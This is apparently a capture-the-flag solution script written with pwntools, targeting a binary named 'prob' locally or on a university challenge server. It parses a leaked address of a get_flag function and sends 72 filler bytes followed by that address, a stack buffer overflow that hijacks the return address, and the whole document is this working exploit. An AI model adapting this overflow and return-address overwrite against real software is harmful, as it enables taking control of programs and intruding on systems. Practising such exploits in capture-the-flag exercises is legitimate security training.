from pwn import *
context.terminal = "tmux splitw -h".split()

e = ELF("./prob")
if args.REMOTE: 
    p =remote("kayle.snu.ac.kr",10032)
else: 
    p = process("./prob")
    gdb.attach(p)

#p.sendline(cyclic(128))
p.recvuntil(b"() : ")
leak = p.recvuntil('\n')
addr_of_flag = int(leak.split(b'\n')[0],16)
success(f"addr of get_flag : {hex(addr_of_flag)}")

#greet_user() 함수 처리
p.recvuntil(b"Welcome! Please enter your username: ")
p.sendline(b"nina")

p.recvuntil(b"What would you like me to repeat back? ")
payload = b"A" * 64  



p.sendline(b"A" * 72 + p64(addr_of_flag))

p.interactive()